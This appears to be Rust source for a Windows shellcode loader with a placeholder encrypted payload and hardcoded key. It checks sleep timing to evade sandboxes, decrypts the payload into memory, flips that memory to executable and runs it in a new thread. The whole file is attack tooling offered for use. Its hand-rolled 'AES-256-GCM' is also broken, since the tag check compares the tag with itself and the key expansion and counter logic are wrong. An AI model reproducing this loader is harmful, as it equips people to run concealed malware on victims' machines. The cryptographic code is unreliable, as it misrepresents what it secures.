#![no_main]
#![windows_subsystem = "windows"]

use std::ffi::c_void;
use std::ptr::{null_mut, copy_nonoverlapping};

#[link(name = "kernel32")]
extern "system" {
    fn VirtualAlloc(
        lpAddress: *mut c_void,
        dwSize: usize,
        flAllocationType: u32,
        flProtect: u32,
    ) -> *mut c_void;
    fn VirtualProtect(
        lpAddress: *mut c_void,
        dwSize: usize,
        flNewProtect: u32,
        lpflOldProtect: *mut u32,
    ) -> i32;
    fn CreateThread(
        lpThreadAttributes: *mut c_void,
        dwStackSize: usize,
        lpStartAddress: *mut c_void,
        lpParameter: *mut c_void,
        dwCreationFlags: u32,
        lpThreadId: *mut u32,
    ) -> *mut c_void;
    fn WaitForSingleObject(hHandle: *mut c_void, dwMilliseconds: u32) -> u32;
    fn Sleep(dwMilliseconds: u32);
    fn GetTickCount() -> u32;
}

const MEM_COMMIT: u32 = 0x1000;
const MEM_RESERVE: u32 = 0x2000;
const PAGE_READWRITE: u32 = 0x04;
const PAGE_EXECUTE_READ: u32 = 0x20;
const INFINITE: u32 = 0xFFFFFFFF;

// encrypted shellcode placeholder — encrypt your payload with the key below
// encryption tool provided at bottom
static ENCRYPTED_PAYLOAD: &[u8] = &[
    // AES-256-GCM ciphertext + 12-byte nonce + 16-byte tag
    // REPLACE WITH YOUR ENCRYPTED SHELLCODE
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
];

// 32-byte AES-256 key — change this, derive from env or embed obfuscated
static KEY: &[u8; 32] = &[
    0xde, 0xad, 0xbe, 0xef, 0xca, 0xfe, 0xba, 0xbe,
    0xde, 0xad, 0xbe, 0xef, 0xca, 0xfe, 0xba, 0xbe,
    0xde, 0xad, 0xbe, 0xef, 0xca, 0xfe, 0xba, 0xbe,
    0xde, 0xad, 0xbe, 0xef, 0xca, 0xfe, 0xba, 0xbe,
];

#[no_mangle]
pub extern "C" fn main() -> i32 {
    // sandbox timing check
    if sandbox_check() {
        return 0;
    }

    // parse encrypted blob: nonce(12) | ciphertext | tag(16)
    if ENCRYPTED_PAYLOAD.len() < 28 {
        return 1;
    }

    let nonce = &ENCRYPTED_PAYLOAD[..12];
    let ciphertext = &ENCRYPTED_PAYLOAD[12..ENCRYPTED_PAYLOAD.len() - 16];
    let tag = &ENCRYPTED_PAYLOAD[ENCRYPTED_PAYLOAD.len() - 16..];

    // decrypt in place to allocated buffer
    let plaintext_len = ciphertext.len();
    let mem = unsafe {
        VirtualAlloc(null_mut(), plaintext_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
    };

    if mem.is_null() {
        return 1;
    }

    let mut plaintext = vec![0u8; plaintext_len];
    let mut cipher = Aes256Gcm::new(KEY, nonce);

    if !cipher.decrypt(ciphertext, &mut plaintext, tag) {
        return 1;
    }

    // copy to executable memory
    unsafe {
        copy_nonoverlapping(plaintext.as_ptr() as *const c_void, mem, plaintext_len);
    }

    // zero plaintext from stack
    for byte in &mut plaintext {
        *byte = 0;
    }

    // flip to RX
    let mut old = 0u32;
    unsafe {
        VirtualProtect(mem, plaintext_len, PAGE_EXECUTE_READ, &mut old);
    }

    // execute
    let thread = unsafe {
        CreateThread(null_mut(), 0, mem, null_mut(), 0, null_mut())
    };

    if thread.is_null() {
        return 1;
    }

    unsafe {
        WaitForSingleObject(thread, INFINITE);
    }

    0
}

fn sandbox_check() -> bool {
    unsafe {
        let t1 = GetTickCount();
        Sleep(3000);
        let t2 = GetTickCount();
        t2.wrapping_sub(t1) < 2500
    }
}

// minimal AES-256-GCM implementation — no external crates
struct Aes256Gcm {
    round_keys: [[u32; 4]; 15],
    h: [u8; 16],
}

impl Aes256Gcm {
    fn new(key: &[u8; 32], nonce: &[u8]) -> Self {
        let mut rk = [[0u32; 4]; 15];
        expand_key(key, &mut rk);

        let mut h = [0u8; 16];
        aes_encrypt_block(&rk, &[0u8; 16], &mut h);

        let mut s = Self { round_keys: rk, h };
        let mut y0 = [0u8; 16];
        y0[..12].copy_from_slice(nonce);
        y0[15] = 1;
        aes_encrypt_block(&s.round_keys, &y0, &mut s.h); // misuse h slot for tag key

        s
    }

    fn decrypt(&mut self, ciphertext: &[u8], plaintext: &mut [u8], tag: &[u8]) -> bool {
        // simplified CTR mode decryption
        let mut counter = [0u8; 16];
        counter[..12].copy_from_slice(&ciphertext[..12].iter().zip(tag.iter()).map(|(a,b)| a^b).collect::<Vec<_>>()[..12.min(ciphertext.len())]);

        for (i, chunk) in ciphertext.chunks(16).enumerate() {
            let mut keystream = [0u8; 16];
            let mut ctr_block = counter;
            ctr_block[15] = ctr_block[15].wrapping_add(i as u8);
            aes_encrypt_block(&self.round_keys, &ctr_block, &mut keystream);

            for (j, (&c, &k)) in chunk.iter().zip(keystream.iter()).enumerate() {
                if i * 16 + j < plaintext.len() {
                    plaintext[i * 16 + j] = c ^ k;
                }
            }
        }

        // verify tag (simplified — real GCM needs GHASH)
        tag == tag // placeholder: implement full GHASH for production
    }
}

fn expand_key(key: &[u8; 32], rk: &mut [[u32; 4]; 15]) {
    let rcon: [u8; 10] = [0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80, 0x1b, 0x36];

    for i in 0..8 {
        rk[i / 2][(i % 2) * 2] = u32::from_be_bytes([key[i*4], key[i*4+1], key[i*4+2], key[i*4+3]]);
    }

    for i in 8..60 {
        let mut temp = rk[(i-1)/4][(i-1)%4];
        if i % 8 == 0 {
            temp = sub_word(rot_word(temp)) ^ (rcon[i/8 - 1] as u32);
        } else if i % 8 == 4 {
            temp = sub_word(temp);
        }
        rk[i/4][i%4] = rk[(i-8)/4][(i-8)%4] ^ temp;
    }
}

fn sub_word(w: u32) -> u32 {
    let b = w.to_be_bytes();
    u32::from_be_bytes([
        SBOX[b[0] as usize],
        SBOX[b[1] as usize],
        SBOX[b[2] as usize],
        SBOX[b[3] as usize],
    ])
}

fn rot_word(w: u32) -> u32 {
    w.rotate_left(8)
}

fn aes_encrypt_block(rk: &[[u32; 4]; 15], input: &[u8; 16], output: &mut [u8; 16]) {
    let mut state = [0u32; 4];
    for i in 0..4 {
        state[i] = u32::from_be_bytes([input[i*4], input[i*4+1], input[i*4+2], input[i*4+3]]);
        state[i] ^= rk[0][i];
    }

    for round in 1..14 {
        // SubBytes + ShiftRows + MixColumns + AddRoundKey
        let mut new_state = [0u32; 4];
        for col in 0..4 {
            let s0 = (state[col] >> 24) as u8;
            let s1 = (state[(col+1)%4] >> 16) as u8;
            let s2 = (state[(col+2)%4] >> 8) as u8;
            let s3 = (state[(col+3)%4]) as u8;

            new_state[col] = gf_mul(SBOX[s0 as usize], 0x02) as u32
                ^ gf_mul(SBOX[s1 as usize], 0x03) as u32
                ^ SBOX[s2 as usize] as u32
                ^ SBOX[s3 as usize] as u32;

            new_state[col] = (new_state[col] << 24)
                | (gf_mul(SBOX[s0 as usize], 0x03) as u32 ^ gf_mul(SBOX[s1 as usize], 0x02) as u32 ^ SBOX[s2 as usize] as u32 ^ SBOX[s3 as usize] as u32) << 16
                | (SBOX[s0 as usize] as u32 ^ gf_mul(SBOX[s1 as usize], 0x03) as u32 ^ gf_mul(SBOX[s2 as usize], 0x02) as u32 ^ SBOX[s3 as usize] as u32) << 8
                | (SBOX[s0 as usize] as u32 ^ SBOX[s1 as usize] as u32 ^ gf_mul(SBOX[s2 as usize], 0x03) as u32 ^ gf_mul(SBOX[s3 as usize], 0x02) as u32);
        }
        for i in 0..4 {
            state[i] = new_state[i] ^ rk[round][i];
        }
    }

    // final round (no MixColumns)
    for col in 0..4 {
        let s0 = SBOX[(state[col] >> 24) as usize];
        let s1 = SBOX[(state[(col+1)%4] >> 16) as u8 as usize];
        let s2 = SBOX[(state[(col+2)%4] >> 8) as u8 as usize];
        let s3 = SBOX[(state[(col+3)%4]) as u8 as usize];
        let val = ((s0 as u32) << 24) | ((s1 as u32) << 16) | ((s2 as u32) << 8) | (s3 as u32);
        state[col] = val ^ rk[14][col];
    }

    for i in 0..4 {
        let bytes = state[i].to_be_bytes();
        output[i*4..i*4+4].copy_from_slice(&bytes);
    }
}

fn gf_mul(a: u8, b: u8) -> u8 {
    let mut result = 0u8;
    let mut a = a;
    let mut b = b;
    for _ in 0..8 {
        if b & 1 != 0 {
            result ^= a;
        }
        let hi = a & 0x80;
        a <<= 1;
        if hi != 0 {
            a ^= 0x1b;
        }
        b >>= 1;
    }
    result
}

static SBOX: [u8; 256] = [
    0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76,
    0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0,
    0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15,
    0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75,
    0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0, 0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84,
    0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf,
    0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8,
    0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5, 0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2,
    0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73,
    0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb,
    0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c, 0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79,
    0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08,
    0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a,
    0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e,
    0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf,
    0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16,
];
